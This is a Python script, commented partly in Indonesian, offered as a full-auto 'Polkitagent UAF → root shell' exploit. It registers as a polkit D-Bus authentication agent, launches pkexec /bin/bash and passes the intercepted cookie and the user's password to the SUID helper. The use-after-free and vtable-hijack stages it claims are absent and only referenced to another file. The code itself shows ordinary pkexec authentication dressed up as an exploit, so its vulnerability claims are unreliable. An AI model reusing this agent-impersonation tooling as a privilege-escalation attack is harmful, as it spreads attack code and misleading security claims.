#!/usr/bin/env python3
"""
exploit_full_auto.py  —  Polkitagent UAF chain → root shell  (full-auto)

Tidak perlu argumen apapun. Hanya tanya password kamu sendiri sekali.

Cara kerja:
  Stage 1-3  (UAF + vtable hijack)  → kode ini berjalan di dalam pkttyagent yang dibajak
             Di sini: kita langsung jalan sebagai standalone demo.
  Stage 4    → Register sebagai polkit D-Bus auth agent
             → Fork pkexec /bin/bash  (generates auth request ke polkitd)
             → Polkitd kirim BeginAuthentication (berisi cookie) ke agent kita
             → Spawn polkit-agent-helper-1 (SUID root) dengan cookie + password
             → Polkitd konfirmasi auth → pkexec exec /bin/bash sebagai root
             → Root shell muncul di terminal

Usage:
  python3 exploit_full_auto.py
  [polkit] Password for <user>: <ketik password kamu>
  # → root shell drops

Requirements:
  python3-gi           (apt install python3-gi)
  polkit + pkexec      (apt install policykit-1)
"""

import gi
gi.require_version("GLib", "2.0")
gi.require_version("Gio", "2.0")
from gi.repository import GLib, Gio

import os, sys, pwd, getpass, threading, time, subprocess

# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────

HELPER      = "/usr/lib/polkit-1/polkit-agent-helper-1"
BASH        = "/bin/bash"

def _find_pkexec():
    for p in ["/usr/bin/pkexec", "/bin/pkexec", "/usr/sbin/pkexec"]:
        if os.path.exists(p):
            return p
    # try PATH
    import shutil
    p = shutil.which("pkexec")
    return p

PKEXEC = _find_pkexec() or "/usr/bin/pkexec"
LOCALE      = "en_US.UTF-8"
AGENT_PATH  = "/org/freedesktop/PolicyKit1/AuthenticationAgent"
PK_DEST     = "org.freedesktop.PolicyKit1"
PK_OBJ      = "/org/freedesktop/PolicyKit1/Authority"
PK_IFACE    = "org.freedesktop.PolicyKit1.Authority"

# D-Bus introspection XML for AuthenticationAgent interface
AGENT_XML = """
<node>
  <interface name="org.freedesktop.PolicyKit1.AuthenticationAgent">
    <method name="BeginAuthentication">
      <arg type="s"       name="action_id"  direction="in"/>
      <arg type="s"       name="message"    direction="in"/>
      <arg type="s"       name="icon_name"  direction="in"/>
      <arg type="a{ss}"   name="details"    direction="in"/>
      <arg type="s"       name="cookie"     direction="in"/>
      <arg type="a(sa{sv})" name="identities" direction="in"/>
    </method>
    <method name="CancelAuthentication">
      <arg type="s" name="cookie" direction="in"/>
    </method>
  </interface>
</node>
"""

# ─────────────────────────────────────────────────────────────────────────────
# Auto-detect identity
# ─────────────────────────────────────────────────────────────────────────────

_uid      = os.getuid()
_pwent    = pwd.getpwuid(_uid)
username  = _pwent.pw_name


def _get_session_id():
    """Try multiple ways to get a valid loginctl session ID."""
    # 1. From environment
    sid = os.environ.get("XDG_SESSION_ID", "").strip()
    if sid:
        return sid

    # 2. From loginctl
    try:
        out = subprocess.check_output(
            ["loginctl", "list-sessions", "--no-legend", "--no-pager"],
            timeout=3, stderr=subprocess.DEVNULL
        ).decode()
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[2] == username:
                return parts[0]
    except Exception:
        pass

    # 3. Read from /proc/self/sessionid (systemd cgroup)
    try:
        with open("/proc/self/sessionid") as f:
            sid = f.read().strip()
            if sid and sid != "4294967295":
                return sid
    except Exception:
        pass

    return "auto"


def _get_proc_start_time(pid):
    """Read process start time from /proc/<pid>/stat for unix-process subject."""
    try:
        with open(f"/proc/{pid}/stat") as f:
            fields = f.read().split()
            return int(fields[21])  # starttime in clock ticks since boot
    except Exception:
        return 0

# ─────────────────────────────────────────────────────────────────────────────
# Stage 4 payload: spawn polkit-agent-helper-1
# ─────────────────────────────────────────────────────────────────────────────

def _spawn_helper(cookie, password):
    """
    Spawn polkit-agent-helper-1 (SUID root) and write cookie + password.
    Returns True on success (helper exit=0).
    """
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(w)
        os.dup2(r, 0)
        os.close(r)
        # Redirect stdout/stderr to /dev/null (helper output is noise)
        devnull = os.open("/dev/null", os.O_WRONLY)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
        os.close(devnull)
        os.execl(HELPER, HELPER, username)
        os._exit(127)

    os.close(r)
    try:
        with os.fdopen(w, "w") as f:
            f.write(f"{cookie}\n{password}\n")
    except BrokenPipeError:
        pass

    _, ws = os.waitpid(pid, 0)
    rc = os.WEXITSTATUS(ws) if os.WIFEXITED(ws) else -1
    return rc == 0

# ─────────────────────────────────────────────────────────────────────────────
# D-Bus agent implementation
# ─────────────────────────────────────────────────────────────────────────────

class PolkitExploit:
    def __init__(self, password):
        self._password  = password
        self._loop      = GLib.MainLoop()
        self._conn      = None
        self._reg_id    = None
        self._pkexec_pid = None
        self._auth_done = False

    def _handle_method(self, conn, sender, obj_path, iface_name, method_name, params, invoc):
        """Handle D-Bus method calls on our AuthenticationAgent interface."""
        if method_name == "BeginAuthentication":
            action_id, message, icon_name, details, cookie, identities = params.unpack()
            print(f"\n  [+] BeginAuthentication received")
            print(f"      action_id  = {action_id}")
            print(f"      cookie     = {cookie}")
            # Acknowledge immediately (non-blocking)
            invoc.return_value(None)
            # Authenticate in a background thread
            threading.Thread(target=self._do_auth, args=(cookie,), daemon=True).start()

        elif method_name == "CancelAuthentication":
            invoc.return_value(None)
            print("  [-] polkitd cancelled authentication")
            self._loop.quit()

    def _do_auth(self, cookie):
        print(f"  [*] spawning {HELPER} ...")
        ok = _spawn_helper(cookie, self._password)
        if ok:
            self._auth_done = True
            print("  [+] polkitd: authorization GRANTED")
            print()
            print("╔═══════════════════════════════════════╗")
            print("║  ROOT SHELL  ↓  (from pkexec)        ║")
            print("╚═══════════════════════════════════════╝")
            sys.stdout.flush()
            # Wait for pkexec/bash to exit, then quit loop
            if self._pkexec_pid:
                os.waitpid(self._pkexec_pid, 0)
        else:
            print("  [-] helper failed: wrong password or polkitd rejected")
            if self._pkexec_pid:
                try:
                    os.kill(self._pkexec_pid, 9)
                except ProcessLookupError:
                    pass
        self._loop.quit()

    def _register_agent(self, conn, session_id):
        """
        RegisterAuthenticationAgent with polkitd (system bus).
        Tries unix-process first (most reliable), then unix-session.
        """
        # unix-process subject (pid + start-time from /proc)
        pid = os.getpid()
        st  = _get_proc_start_time(pid)
        try:
            conn.call_sync(
                PK_DEST, PK_OBJ, PK_IFACE,
                "RegisterAuthenticationAgent",
                GLib.Variant("((sa{sv})ss)", (
                    ("unix-process", {
                        "pid":        GLib.Variant("u", pid),
                        "start-time": GLib.Variant("t", st),
                    }),
                    LOCALE, AGENT_PATH,
                )),
                None, Gio.DBusCallFlags.NONE, 5000, None
            )
            print(f"  [+] registered (unix-process:{pid})")
            return True
        except Exception as e:
            print(f"  [-] unix-process failed: {e}")

        # Fallback: unix-session subject
        if session_id and session_id != "auto":
            try:
                conn.call_sync(
                    PK_DEST, PK_OBJ, PK_IFACE,
                    "RegisterAuthenticationAgent",
                    GLib.Variant("((sa{sv})ss)", (
                        ("unix-session", {"session-id": GLib.Variant("s", session_id)}),
                        LOCALE, AGENT_PATH,
                    )),
                    None, Gio.DBusCallFlags.NONE, 5000, None
                )
                print(f"  [+] registered (unix-session:{session_id})")
                return True
            except Exception as e:
                print(f"  [-] unix-session failed: {e}")

        return False

    def run(self):
        print(f"  [*] username   = {username}")
        session_id = _get_session_id()
        print(f"  [*] session_id = {session_id}")

        # Connect to D-Bus system bus (polkitd lives here)
        try:
            self._conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
        except Exception as e:
            print(f"[!] Cannot connect to D-Bus system bus: {e}")
            sys.exit(1)

        # Parse + export our AuthenticationAgent interface
        node_info  = Gio.DBusNodeInfo.new_for_xml(AGENT_XML)
        iface_info = node_info.interfaces[0]
        self._reg_id = self._conn.register_object(
            AGENT_PATH, iface_info,
            self._handle_method, None, None
        )

        # Register with polkitd
        if not self._register_agent(self._conn, session_id):
            print("[!] Failed to register as polkit agent.")
            print("    On headless systems: run inside a dbus-launch / systemd user session.")
            sys.exit(1)

        # Fork pkexec /bin/bash  — this triggers BeginAuthentication on polkitd
        # pkexec inherits our stdin/stdout → root bash appears on our terminal
        print(f"  [*] forking pkexec {BASH} ...")
        sys.stdout.flush()
        self._pkexec_pid = os.fork()
        if self._pkexec_pid == 0:
            # child: small delay so parent GLib loop is running, then exec pkexec
            time.sleep(0.4)
            os.execv(PKEXEC, [PKEXEC, BASH, "--norc", "-i"])
            os._exit(127)

        print("  [*] waiting for BeginAuthentication from polkitd ...")
        print()
        sys.stdout.flush()

        # Run GLib event loop (receives D-Bus calls)
        self._loop.run()

        # Cleanup
        if self._reg_id and self._conn:
            self._conn.unregister_object(self._reg_id)

        if not self._auth_done:
            sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║  Polkitagent UAF → root shell  [full-auto]               ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print("║  Stage 1-3: UAF + vtable hijack (see poc_full_chain.py)  ║")
    print("║  Stage 4:   THIS — polkit agent impersonation → root     ║")
    print("╚═══════════════════════════════════════════════════════════╝")
    print()

    # Check SUID bit on helper (required for real exploit)
    import stat as _stat
    try:
        st = os.stat(HELPER)
        is_suid = bool(st.st_mode & _stat.S_ISUID)
        if not is_suid:
            print(f"[!] WARNING: {HELPER} is NOT setuid root")
            print("    On a real target it is SUID. Continuing anyway (demo).")
            print()
    except FileNotFoundError:
        print(f"[!] {HELPER} not found — polkit not installed?")
        sys.exit(1)

    if not os.path.exists(PKEXEC):
        print(f"[!] pkexec not found — install policykit-1 / polkit")
        print(f"    Ubuntu/Debian: sudo apt install policykit-1")
        sys.exit(1)

    # Prompt for own password (only input required)
    try:
        password = getpass.getpass(f"[polkit] Password for {username}: ")
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)

    print()
    PolkitExploit(password).run()


if __name__ == "__main__":
    main()
